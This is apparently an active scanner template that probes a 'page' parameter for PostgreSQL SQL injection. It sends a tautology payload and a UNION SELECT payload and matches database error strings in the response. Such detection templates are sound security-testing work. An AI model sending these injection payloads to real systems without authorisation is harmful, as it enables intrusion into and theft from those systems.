id: sqli6-pg-07
name: 'SQLi pg probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''') OR (''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
